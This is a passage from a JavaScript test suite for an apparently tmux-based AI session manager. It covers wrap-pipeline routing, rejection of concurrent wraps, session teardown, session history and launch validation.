      // `test/wrap-pipeline.test.js`. Also stub the other real Chunk
      // 4–8 handlers that hit live OS state (lint/test/ai-content/
      // priming-roll/pr-check) so the routing assertion
      // doesn't accidentally trip on a missing tmux session.
      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const realKinds = ['lint', 'test', 'ai-content', 'learnings-db-write', 'rule-proposal', 'priming-roll', 'pr-check', 'pr-merge', 'commit', 'features-toc', 'project-map', 'index-describe'];
      const dispatchOrig = {};
      const noopRun = async () => ({ ok: true, status: 'done', output: null, blockers: [] });
      for (const kind of realKinds) {
        dispatchOrig[kind] = wrapPipelineMod.STEP_DISPATCH[kind];
        wrapPipelineMod.STEP_DISPATCH[kind] = { run: noopRun };
      }

      try {
        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true, 'V2 pipeline of no-op stubs returns ok:true');
        assert.equal(sentCommand, null, 'V2 path must not send any tmux command');
        assert.ok(result.pipelineResult, 'V2 result carries the structured pipeline output');
        // #207 Chunk 3 added `features-toc` between `next-session-prime`
        // and `memory-update`; CC-1 appended `continuity-write` after
        // `commit`; C2 (#353) stripped the L3 `critic-check` step and #570
        // deleted its handler; PIDX slice 3 (#360) added `project-map` after
        // `features-toc`; PIDX #426 added `index-describe` after `project-map`;
        // #466 added `learnings-db-write` after `learnings-capture`; #570 added
        // `apply-pr-resolutions` last — prawduct now ships 13 steps.
        assert.equal(result.pipelineResult.results.length, 14,
          'prawduct pipeline runs all fourteen steps');
        assert.equal(result.wrapCommand, null, 'V2 reports no legacy wrapCommand');
      } finally {
        for (const kind of realKinds) {
          wrapPipelineMod.STEP_DISPATCH[kind] = dispatchOrig[kind];
        }
      }
    });

    it('#334 — webui session (null tmux) routes to the V2 pipeline; ai-content steps SKIP (not halt)', async () => {
      const project = store.projects.getByName('prime-test');
      store.projects.update(project.id, { methodology: 'prawduct' });
      const origCfg = store.projectConfig.load(project.path);
      // WebUI/OpenClaw session: no tmux pane by design (sessions.js records
      // tmuxSession:null, sessionMode:'webui').
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: null,
        sessionMode: 'webui'
      });

      // Stub the OS-hitting handlers, but leave `ai-content` REAL so the
      // webui-skip path is exercised end-to-end. The content ai-content steps
      // are blocker:true — if the webui skip regresses, they return `blocked`
      // (no tmux) and HALT the pipeline, failing this test.
      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const stubbedKinds = ['lint', 'test', 'priming-roll', 'pr-check', 'pr-merge', 'commit', 'features-toc', 'project-map', 'index-describe', 'continuity-write'];
      const dispatchOrig = {};
      const noopRun = async () => ({ ok: true, status: 'done', output: null, blockers: [] });
      for (const kind of stubbedKinds) {
        dispatchOrig[kind] = wrapPipelineMod.STEP_DISPATCH[kind];
        wrapPipelineMod.STEP_DISPATCH[kind] = { run: noopRun };
      }

      try {
        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true, 'webui V2 wrap completes (ai-content skipped, not halted)');
        assert.notEqual(result.error && result.error.includes('No active session'), true,
          'webui session must NOT be rejected as "no active session"');
        assert.equal(sentCommand, null, 'V2 path must not send any tmux command');
        assert.equal(result.pipelineResult.blockedAt, null, 'webui wrap did not halt at any blocker step');
        const aiSteps = result.pipelineResult.results.filter((r) => r.kind === 'ai-content');
        assert.ok(aiSteps.length >= 1, 'pipeline has ai-content steps');
        for (const s of aiSteps) {
          assert.equal(s.status, 'skipped', `ai-content step ${s.stepId} must skip on webui, not block`);
        }
      } finally {
        store.projectConfig.save(project.path, origCfg);
        for (const kind of stubbedKinds) {
          wrapPipelineMod.STEP_DISPATCH[kind] = dispatchOrig[kind];
        }
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.wrap(active.id, 'test cleanup');
      }
    });

    it('webui session with a stale wrapV2:false runs the pipeline (retired opt-out cannot strand it)', async () => {
      // Before the legacy strip, wrapV2:false + null tmux was a dead end
      // (the legacy wrap needed a pane). Now the stale key is ignored and
      // the tmux-free pipeline serves the session.
      const project = store.projects.getByName('prime-test');
      const origCfg = store.projectConfig.load(project.path);
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: null,
        sessionMode: 'webui'
      });
      store.projectConfig.save(project.path, { ...origCfg, wrapV2: false });

      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const realRun = wrapPipelineMod.runWrapPipeline;
      wrapPipelineMod.runWrapPipeline = async () => EMPTY_V2_RESULT;

      try {
        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true, 'stale opt-out must not produce an error for a webui session');
        assert.ok(result.pipelineResult, 'pipeline served the wrap');
        assert.equal(sentCommand, null, 'must not send keys to a null tmux pane');
      } finally {
        wrapPipelineMod.runWrapPipeline = realRun;
        store.projectConfig.save(project.path, origCfg);
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.wrap(active.id, 'test cleanup');
      }
    });

    // #583 — THE incident regression pin. 2026-07-16: a wrap POST died with
    // a mid-flight server restart, the operator re-POSTed, and a second full
    // pipeline re-fired every AI content step from step 0. Client-side
    // single-flight (#519) can't span tabs/devices/reloads — the guard must
    // live server-side: one running pipeline per project, a concurrent
    // trigger rejected WITHOUT starting a second pipeline, and the finished
    // run's result retrievable after the triggering connection is gone.
    it('#583 — second triggerWrap while a V2 pipeline is in flight is rejected and starts NO second pipeline', async () => {
      const project = store.projects.getByName('prime-test');
      store.projects.update(project.id, { methodology: 'prawduct' });
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-single-flight-test'
      });
      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const wrapRunRegistry = require('../lib/wrap-run-registry');
      wrapRunRegistry._resetForTests();
      const realRun = wrapPipelineMod.runWrapPipeline;
      let pipelineCalls = 0;
      let releaseGate;
      const gate = new Promise((resolve) => { releaseGate = resolve; });
      wrapPipelineMod.runWrapPipeline = async (projectName, options) => {
        pipelineCalls += 1;
        // Report progress like the real runner would, then hold the
        // pipeline open so the second trigger races a genuinely-running run.
        if (options && typeof options.onStepStart === 'function') {
          options.onStepStart('changelog-update', 'ai-content');
        }
        await gate;
        return { ok: true, blockedAt: null, results: [], commitSha: null, summary: null, error: null };
      };

      try {
        const first = sessions.triggerWrap('prime-test');
        // Let the first trigger claim the registry slot before racing it.
        await new Promise((resolve) => setImmediate(resolve));

        const status = sessions.getWrapRunStatus('prime-test');
        assert.equal(status.running, true, 'registry reports the run while in flight');
        assert.equal(status.currentStepId, 'changelog-update', 'progress hook feeds the registry');

        const second = await sessions.triggerWrap('prime-test');
        assert.equal(second.ok, false, 'concurrent wrap is rejected');
        assert.equal(second.code, 'WRAP_IN_PROGRESS', 'rejection carries the machine-readable code');
        assert.ok(second.wrapRun && typeof second.wrapRun.startedAt === 'number',
          'rejection carries the running run info (since when)');
        assert.equal(pipelineCalls, 1, 'THE PIN: the second trigger must not start a second pipeline');

        releaseGate();
        const firstResult = await first;
        assert.equal(firstResult.ok, true, 'the original wrap completes normally');

        const after = sessions.getWrapRunStatus('prime-test');
        assert.equal(after.running, false, 'registry frees the slot on completion');
        assert.ok(after.result && after.result.pipelineResult,
          'the finished result stays retrievable for a client whose POST connection died');
        assert.equal(typeof after.finishedAt, 'number', 'finishedAt recorded for freshness checks');

        // With the run finished, a NEW wrap may start (explicit human retry).
        const third = await sessions.triggerWrap('prime-test');
        assert.equal(third.ok, true, 'a fresh wrap after completion is allowed');
        assert.equal(pipelineCalls, 2, 'the fresh wrap runs a new pipeline');
      } finally {
        wrapPipelineMod.runWrapPipeline = realRun;
        wrapRunRegistry._resetForTests();
      }
    });

    it('#583 — a pipeline that throws still frees the single-flight slot and records the failure', async () => {
      const project = store.projects.getByName('prime-test');
      store.projects.update(project.id, { methodology: 'prawduct' });
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-throw-slot-test'
      });
      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const wrapRunRegistry = require('../lib/wrap-run-registry');
      wrapRunRegistry._resetForTests();
      const realRun = wrapPipelineMod.runWrapPipeline;
      wrapPipelineMod.runWrapPipeline = async () => { throw new Error('pipeline exploded'); };

      try {
        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, false);
        assert.match(result.error, /pipeline exploded/);

        const status = sessions.getWrapRunStatus('prime-test');
        assert.equal(status.running, false, 'a thrown pipeline must not leave the slot claimed');
        assert.ok(status.result && status.result.error.includes('pipeline exploded'),
          'the failure is recorded for the reattach path');

        // The slot is genuinely free — a retry starts a new pipeline.
        wrapPipelineMod.runWrapPipeline = async () => (
          { ok: true, blockedAt: null, results: [], commitSha: null, summary: null, error: null }
        );
        const retry = await sessions.triggerWrap('prime-test');
        assert.equal(retry.ok, true, 'retry after a thrown pipeline is not locked out');
      } finally {
        wrapPipelineMod.runWrapPipeline = realRun;
        wrapRunRegistry._resetForTests();
      }
    });

    it('forwards triggerWrap options to runWrapPipeline (#139 Chunk 10)', async () => {
      const project = store.projects.getByName('prime-test');
      store.projects.update(project.id, { methodology: 'prawduct' });
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-v2-options-test'
      });

      // Capture the options the runner receives by patching the module
      // export. The runner's full execution is exercised in
      // wrap-pipeline tests; here we only pin the options-threading
      // contract introduced in Chunk 10.
      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const realRun = wrapPipelineMod.runWrapPipeline;
      let receivedOptions;
      wrapPipelineMod.runWrapPipeline = async (projectName, options) => {
        receivedOptions = options;
        return {
          ok: true,
          blockedAt: null,
          results: [],
          commitSha: null,
          summary: null,
          error: null
        };
      };

      try {
        const opts = {
          skipTests: true,
          prHandling: { '42': 'merge' }
        };
        await sessions.triggerWrap('prime-test', opts);
        // #583 amended the threading contract: user options pass through
        // unchanged, PLUS the wrap-run registry's progress hook rides
        // along (and nothing else).
        const { onStepStart, ...userOptions } = receivedOptions;
        assert.deepEqual(userOptions, opts,
          'user options must reach runWrapPipeline unchanged');
        assert.equal(typeof onStepStart, 'function',
          '#583: the registry progress hook is threaded to the runner');

        // Omitted options still reach the runner carrying ONLY the hook —
        // no user keys invented.
        receivedOptions = 'sentinel-not-set';
        await sessions.triggerWrap('prime-test');
        assert.deepEqual(Object.keys(receivedOptions), ['onStepStart'],
          'omitted options add only the #583 progress hook');

        // A caller-supplied onStepStart (an HTTP body can only carry JSON,
        // but defend the seam) can never displace the registry hook.
        await sessions.triggerWrap('prime-test', { onStepStart: 'not-a-function' });
        assert.equal(typeof receivedOptions.onStepStart, 'function',
          'caller options must not override the registry progress hook');
      } finally {
        wrapPipelineMod.runWrapPipeline = realRun;
      }
    });

    it('wrapV2 absent from projConfig (older on-disk state) routes to the pipeline', async () => {
      // Older project.json files written before #139 don't carry a
      // `wrapV2` field. The retired flag is no longer consulted at all,
      // so absence-of-flag runs the pipeline like everything else.
      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const originalRun = wrapPipelineMod.runWrapPipeline;
      wrapPipelineMod.runWrapPipeline = async () => EMPTY_V2_RESULT;

      const project = store.projects.getByName('prime-test');
      store.projects.update(project.id, { methodology: 'prawduct' });
      const cfgPath = path.join(project.path, '.tangleclaw', 'project.json');
      fs.mkdirSync(path.dirname(cfgPath), { recursive: true });
      // Persist a config that explicitly OMITS wrapV2.
      const cfgNoFlag = JSON.parse(JSON.stringify(store.projectConfig.load(project.path)));
      delete cfgNoFlag.wrapV2;
      fs.writeFileSync(cfgPath, JSON.stringify(cfgNoFlag, null, 2));

      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-v2-absent-test'
      });

      try {
        const result = await sessions.triggerWrap('prime-test');
        // V2 path ran → no tmux command sent; pipelineResult present.
        assert.equal(sentCommand, null, 'the pipeline path must not send any tmux command');
        assert.ok(result.pipelineResult, 'absent wrapV2 must run the pipeline');
      } finally {
        wrapPipelineMod.runWrapPipeline = originalRun;
      }
    });

    // #139 Chunk 11a — V2 session-lifecycle transition. A successful V2
    // wrap that produced a commit ends the session record (status
    // 'wrapped'), kills tmux, releases doc locks, and clears caches —
    // symmetric with the legacy `completeWrap` teardown minus
    // `_autoCommitIfDirty` (V2's commit step already flushed). Halted /
    // thrown / clean-session (ok + null SHA) runs leave the session
    // active.
    describe('V2 lifecycle transition (#139 Chunk 11a)', () => {
      let wrapPipelineMod;
      let originalRun;
      let originalKill;
      let originalReleaseBySession;
      let killCalls;
      let releaseCalls;

      beforeEach(() => {
        wrapPipelineMod = require('../lib/wrap-pipeline');
        originalRun = wrapPipelineMod.runWrapPipeline;
        originalKill = tmux.killSession;
        originalReleaseBySession = store.documentLocks.releaseBySession;
        killCalls = [];
        releaseCalls = [];
        tmux.killSession = (name) => { killCalls.push(name); };
        store.documentLocks.releaseBySession = (sid) => { releaseCalls.push(sid); return 0; };

        const project = store.projects.getByName('prime-test');
        store.projects.update(project.id, { methodology: 'prawduct' });
      });

      afterEach(() => {
        wrapPipelineMod.runWrapPipeline = originalRun;
        tmux.killSession = originalKill;
        store.documentLocks.releaseBySession = originalReleaseBySession;
      });

      /**
       * Stub runWrapPipeline to return a fixed result so the test can
       * pin the lifecycle behavior without exercising real step handlers.
       */
      function stubPipeline(result) {
        wrapPipelineMod.runWrapPipeline = async () => result;
      }

      it('ok + commitSha → wraps the session and runs full teardown', async () => {
        const project = store.projects.getByName('prime-test');
        const session = store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-ok'
        });

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [
            { stepId: 'memory-update', kind: 'ai-content', status: 'done',
              output: { parsedFields: { summary: 'wrapped via V2' } }, blockers: [] }
          ],
          commitSha: 'abc123',
          summary: null,
          error: null
        });

        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true);

        const active = store.sessions.getActive(project.id);
        assert.equal(active, null, 'session must no longer be active');

        // getLatest orders by started_at DESC; sessions created in the
        // same second tie. Find this test's wrapped record by id.
        const wrappeds = store.sessions.list(project.id, { status: 'wrapped', limit: 100 });
        const wrapped = wrappeds.find((s) => s.id === session.id);
        assert.ok(wrapped, 'wrapped session record must exist');
        assert.equal(wrapped.status, 'wrapped');
        assert.equal(wrapped.wrapSummary, 'wrapped via V2');
        assert.deepEqual(killCalls, ['wrap-v2-lifecycle-ok'], 'tmux session killed');
        assert.deepEqual(releaseCalls, [session.id], 'doc locks released for this session');
      });

      it('ok + null commitSha (clean session) → session stays active', async () => {
        const project = store.projects.getByName('prime-test');
        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-clean'
        });

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [],
          commitSha: null,
          summary: null,
          error: null
        });

        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true);
        const active = store.sessions.getActive(project.id);
        assert.ok(active, 'session must remain active on clean-session wrap');
        assert.deepEqual(killCalls, [], 'tmux not killed on clean-session wrap');
        assert.deepEqual(releaseCalls, [], 'doc locks not released on clean-session wrap');
      });

      it('halted (!ok) → session stays active', async () => {
        const project = store.projects.getByName('prime-test');
        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-halted'
        });

        stubPipeline({
          ok: false,
          blockedAt: 'commit',
          results: [
            { stepId: 'commit', kind: 'commit', status: 'blocked', output: null, blockers: ['pre-commit hook rejected'] }
          ],
          // Commit step that blocked never set its own output.commitSha
          // but the runner could theoretically have surfaced one from a
          // prior step. Pin: a halt always preserves the session.
          commitSha: 'abc123',
          summary: null,
          error: null
        });

        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, false);
        const active = store.sessions.getActive(project.id);
        assert.ok(active, 'session must remain active on halted wrap');
        assert.deepEqual(killCalls, [], 'tmux not killed on halted wrap');
      });

      it('runner thrown → session stays active', async () => {
        const project = store.projects.getByName('prime-test');
        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-thrown'
        });

        wrapPipelineMod.runWrapPipeline = async () => { throw new Error('boom'); };

        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, false);
        assert.ok(result.error.includes('boom'));
        const active = store.sessions.getActive(project.id);
        assert.ok(active, 'session must remain active when the runner throws');
        assert.deepEqual(killCalls, [], 'tmux not killed when the runner throws');
      });

      /**
       * Find this test's just-wrapped session record by id. `getLatest`
       * ties on `started_at` when sessions are created in the same
       * second, so we list by status and pick by id.
       */
      function findWrappedById(projectId, sessionId) {
        const wrappeds = store.sessions.list(projectId, { status: 'wrapped', limit: 200 });
        return wrappeds.find((s) => s.id === sessionId);
      }

      it('summary: parsedFields.summary wins over capturedText', async () => {
        const project = store.projects.getByName('prime-test');
        const session = store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-summary-parsed'
        });

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [
            // First result has capturedText only — would be a fallback hit.
            { stepId: 'changelog-update', kind: 'ai-content', status: 'done',
              output: { capturedText: 'raw text' }, blockers: [] },
            // Second result has parsedFields.summary — should win.
            { stepId: 'memory-update', kind: 'ai-content', status: 'done',
              output: { parsedFields: { summary: 'parsed summary text' } }, blockers: [] }
          ],
          commitSha: 'abc123',
          summary: null,
          error: null
        });

        await sessions.triggerWrap('prime-test');
        const wrapped = findWrappedById(project.id, session.id);
        assert.ok(wrapped, 'wrapped session record must exist');
        assert.equal(wrapped.wrapSummary, 'parsed summary text');
      });

      it('summary: capturedText is fallback when no parsedFields.summary', async () => {
        const project = store.projects.getByName('prime-test');
        const session = store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-summary-captured'
        });

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [
            { stepId: 'changelog-update', kind: 'ai-content', status: 'done',
              output: { capturedText: 'just captured text' }, blockers: [] }
          ],
          commitSha: 'def456',
          summary: null,
          error: null
        });

        await sessions.triggerWrap('prime-test');
        const wrapped = findWrappedById(project.id, session.id);
        assert.ok(wrapped, 'wrapped session record must exist');
        assert.equal(wrapped.wrapSummary, 'just captured text');
      });

      it('summary: null when no step output carries summary signal', async () => {
        const project = store.projects.getByName('prime-test');
        const session = store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-summary-null'
        });

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [
            { stepId: 'commit', kind: 'commit', status: 'done', output: { commitSha: 'abc' }, blockers: [] }
          ],
          commitSha: 'abc',
          summary: null,
          error: null
        });

        await sessions.triggerWrap('prime-test');
        const wrapped = findWrappedById(project.id, session.id);
        assert.ok(wrapped, 'wrapped session record must exist');
        assert.equal(wrapped.wrapSummary, null);
      });

      it('tmux.killSession failure is non-fatal — session still wraps', async () => {
        const project = store.projects.getByName('prime-test');
        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-tmux-throws'
        });

        tmux.killSession = () => { throw new Error('tmux gone'); };

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [],
          commitSha: 'abc',
          summary: null,
          error: null
        });

        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true);
        const active = store.sessions.getActive(project.id);
        assert.equal(active, null, 'session must still be wrapped despite tmux.killSession throwing');
        assert.deepEqual(releaseCalls.length, 1, 'doc-lock release still attempted after tmux failure');
      });

      it('store.sessions.wrap failure is non-fatal — teardown still runs', async () => {
        const project = store.projects.getByName('prime-test');
        const session = store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-wrap-throws'
        });

        // Stub store.sessions.wrap to throw — verifies the helper's
        // try/catch isolates the wrap call from the rest of teardown.
        const originalWrap = store.sessions.wrap;
        store.sessions.wrap = () => { throw new Error('wrap update boom'); };

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [],
          commitSha: 'abc',
          summary: null,
          error: null
        });

        try {
          const result = await sessions.triggerWrap('prime-test');
          // The runner returned ok:true so _triggerWrapV2 also returns
          // ok:true — the wrap-update throw is swallowed inside the
          // teardown helper and surfaces only via log.warn.
          assert.equal(result.ok, true);
          assert.deepEqual(killCalls.length, 1, 'tmux kill still attempted after wrap-update failure');
          assert.deepEqual(releaseCalls.length, 1, 'doc-lock release still attempted after wrap-update failure');
        } finally {
          store.sessions.wrap = originalWrap;
          // Drain the still-active row so afterEach's cleanup doesn't trip.
          const active = store.sessions.getActive(project.id);
          if (active) originalWrap(active.id, 'test cleanup');
          else originalWrap(session.id, 'test cleanup');
        }
      });

      it('second triggerWrap after a successful V2 wrap returns "No active session"', async () => {
        const project = store.projects.getByName('prime-test');
        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-idempotent'
        });

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [],
          commitSha: 'first-sha',
          summary: null,
          error: null
        });

        const first = await sessions.triggerWrap('prime-test');
        assert.equal(first.ok, true, 'first wrap succeeds');

        // Second invocation: session is no longer active, so the
        // entry-point pre-check rejects before reaching the runner.
        // Pins the idempotency contract at the call-site level.
        const callCountBefore = killCalls.length;
        const second = await sessions.triggerWrap('prime-test');
        assert.equal(second.ok, false);
        assert.ok(second.error && second.error.includes('No active session'),
          'second wrap returns no-active-session error');
        assert.equal(killCalls.length, callCountBefore,
          'tmux kill must not run a second time');
      });

      it('releaseBySession failure is non-fatal — session still wraps', async () => {
        const project = store.projects.getByName('prime-test');
        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-lifecycle-locks-throw'
        });

        store.documentLocks.releaseBySession = () => { throw new Error('lock release boom'); };

        stubPipeline({
          ok: true,
          blockedAt: null,
          results: [],
          commitSha: 'abc',
          summary: null,
          error: null
        });

        const result = await sessions.triggerWrap('prime-test');
        assert.equal(result.ok, true);
        const active = store.sessions.getActive(project.id);
        assert.equal(active, null, 'session must still be wrapped despite releaseBySession throwing');
        assert.deepEqual(killCalls.length, 1, 'tmux kill still attempted after lock-release failure');
      });
    });

    // Retirement pins for the `wrapV2` flag itself — the flag is no
    // longer seeded into fresh configs, and a fresh project (no on-disk
    // config at all) runs the pipeline. The legacy-opt-out byte-equal
    // NL-prompt pins that lived here asserted deleted behavior and were
    // consolidated into the opt-out-retired pins earlier in this block.
    describe('wrapV2 flag retired', () => {
      it('DEFAULT_PROJECT_CONFIG no longer carries a wrapV2 key', () => {
        assert.equal('wrapV2' in store.DEFAULT_PROJECT_CONFIG, false,
          'the retired flag must not be re-seeded into project configs');
      });

      it('a fresh project (no on-disk config) runs the pipeline', async () => {
        const wrapPipelineMod = require('../lib/wrap-pipeline');
        const originalRun = wrapPipelineMod.runWrapPipeline;
        wrapPipelineMod.runWrapPipeline = async () => EMPTY_V2_RESULT;

        const project = store.projects.getByName('prime-test');
        store.projects.update(project.id, { methodology: 'prawduct' });

        // Wipe any prior project.json so this test asserts the
        // fresh-project path.
        const cfgPath = path.join(project.path, '.tangleclaw', 'project.json');
        if (fs.existsSync(cfgPath)) fs.unlinkSync(cfgPath);

        store.sessions.start({
          projectId: project.id,
          engineId: 'claude',
          tmuxSession: 'wrap-v2-default-fresh-test'
        });

        try {
          const result = await sessions.triggerWrap('prime-test');
          assert.equal(sentCommand, null, 'the pipeline path must not send any tmux command');
          assert.ok(result.pipelineResult, 'fresh project must run the pipeline');
        } finally {
          wrapPipelineMod.runWrapPipeline = originalRun;
        }
      });
    });
  });

  describe('wrap state persistence (#91)', () => {
    let sessions;
    const tmux = require('../lib/tmux');
    let originalHasSession, originalCapturePane, originalKillSession, originalProbeSession;

    before(() => {
      sessions = require('../lib/sessions');
    });

    beforeEach(() => {
      originalHasSession = tmux.hasSession;
      originalCapturePane = tmux.capturePane;
      originalKillSession = tmux.killSession;
      originalProbeSession = tmux.probeSession;
      tmux.hasSession = () => true;
      // The wrapping path asks `probeSession`, not `hasSession` (#908) — the
      // seam moved when the branch learned to distinguish "tmux said the pane is
      // gone" from "tmux never answered". Re-pointed, not relaxed: this stub
      // still means exactly what `hasSession = () => true` meant, an ANSWERED
      // liveness of true.
      tmux.probeSession = () => ({ live: true, answered: true, cause: null });
      tmux.capturePane = () => ['line1', 'line2', 'line3'];
      tmux.killSession = () => {};
    });

    afterEach(() => {
      tmux.hasSession = originalHasSession;
      tmux.capturePane = originalCapturePane;
      tmux.killSession = originalKillSession;
      tmux.probeSession = originalProbeSession;
      // Cleanup wrapping sessions
      const project = store.projects.getByName('prime-test');
      if (project) {
        const wrapping = store.sessions.getWrapping(project.id);
        if (wrapping) store.sessions.wrap(wrapping.id, 'test cleanup');
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    it('getSessionStatus stays wrapping while tmux is alive', () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'wrap-stays-active-test'
      });
      store.sessions.setWrapping(session.id);

      const status = sessions.getSessionStatus('prime-test');
      assert.equal(status.wrapping, true);
      assert.equal(status.active, false);
    });

    it('does not export WRAP_TIMEOUT_MS or _wrapStartTimes — server-side timeout removed', () => {
      assert.equal(sessions.WRAP_TIMEOUT_MS, undefined);
      assert.equal(sessions._wrapStartTimes, undefined);
    });
  });

  describe('getSessionHistory', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', () => {
      const result = sessions.getSessionHistory('nonexistent');
      assert.deepEqual(result.sessions, []);
      assert.ok(result.error.includes('not found'));
    });

    it('returns session history for known project', () => {
      const result = sessions.getSessionHistory('prime-test');
      assert.ok(result.sessions.length > 0);
      assert.ok(result.total > 0);
      assert.equal(result.error, null);
    });

    it('respects limit option', () => {
      const result = sessions.getSessionHistory('prime-test', { limit: 1 });
      assert.equal(result.sessions.length, 1);
    });

    it('history entries have expected fields', () => {
      const result = sessions.getSessionHistory('prime-test');
      const entry = result.sessions[0];
      assert.ok('id' in entry);
      assert.ok('engine' in entry);
      assert.ok('startedAt' in entry);
      assert.ok('status' in entry);
    });
  });

  describe('launchSession validation', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', () => {
      const result = sessions.launchSession('nonexistent');
      assert.equal(result.session, null);
      assert.ok(result.error.includes('not found'));
    });

    it('returns error for archived project', () => {
      const projDir = path.join(projectsDir, 'archived-proj');
      fs.mkdirSync(projDir, { recursive: true });
      const proj = store.projects.create({
        name: 'archived-proj',
        path: projDir,
        engine: 'claude'
      });
      store.projects.archive(proj.id);

      const result = sessions.launchSession('archived-proj');
      assert.equal(result.session, null);
      assert.ok(result.error.includes('archived'));
    });

    it('returns error for unavailable engine', () => {
      // An engine whose profile EXISTS but whose binary is not on this
      // machine. genesis (the old fixture) was retired in #458, and every
      // remaining bundled engine may legitimately be installed on a dev
      // box — so pin the case with a custom profile whose `which` target
      // cannot exist.
      store.engines.save({
        id: 'tc-test-unavailable',
        name: 'Unavailable Test Engine',
        command: 'tc-definitely-missing-binary',
        interactionModel: 'session',
        configFormat: { filename: null, syntax: null, generator: null },
        detection: { strategy: 'which', target: 'tc-definitely-missing-binary' },
        launch: { shellCommand: 'tc-definitely-missing-binary', args: [], env: {} },
        capabilities: {}
      });
      const projDir = path.join(projectsDir, 'bad-engine');
      fs.mkdirSync(projDir, { recursive: true });
      store.projects.create({
        name: 'bad-engine',
        path: projDir,
        engine: 'tc-test-unavailable'
      });

      const result = sessions.launchSession('bad-engine');
      assert.equal(result.session, null);
      assert.ok(result.error.includes('not available'));
    });
  });

  describe('launchSession adopts orphaned tmux session', () => {
    const tmux = require('../lib/tmux');
    const enginesModule = require('../lib/engines');
    let sessions;
    let originalHasSession;
    let originalDetectEngine;

    before(() => {
      sessions = require('../lib/sessions');

      // Create a project with the claude engine
      const projDir = path.join(projectsDir, 'orphan-test');
      fs.mkdirSync(projDir, { recursive: true });
      store.projects.create({
        name: 'orphan-test',
        path: projDir,
        engine: 'claude'
      });
    });

    beforeEach(() => {
      originalHasSession = tmux.hasSession;
      originalDetectEngine = enginesModule.detectEngine;
    });

    afterEach(() => {
      tmux.hasSession = originalHasSession;
      enginesModule.detectEngine = originalDetectEngine;
      // Clean up any active sessions so tests are independent
      const project = store.projects.getByName('orphan-test');
      if (project) {
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    it('adopts orphaned tmux session instead of failing', () => {
      // Mock: tmux session exists, engine is available
      tmux.hasSession = (name) => name === 'orphan-test';
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });

      const result = sessions.launchSession('orphan-test');

      assert.equal(result.error, null);
      assert.ok(result.session, 'should return a session');
      assert.equal(result.session.tmuxSession, 'orphan-test');
      assert.equal(result.session.engineId, 'claude');
    });

    it('writes project-version.txt during launch (#101 — TC owns the writer)', () => {
      tmux.hasSession = (name) => name === 'orphan-test';
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });

      const project = store.projects.getByName('orphan-test');
      const cachePath = path.join(project.path, '.tangleclaw', 'project-version.txt');
      const seededPkgPath = path.join(project.path, 'package.json');
      try { fs.rmSync(cachePath, { force: true }); } catch {}
      try {
        // Seed a version source so detection has something to write.
        fs.writeFileSync(seededPkgPath, '{"version": "0.1.0"}\n');

        const result = sessions.launchSession('orphan-test');
        assert.equal(result.error, null);
        assert.ok(fs.existsSync(cachePath), 'project-version.txt should exist after launch');
        const body = fs.readFileSync(cachePath, 'utf8');
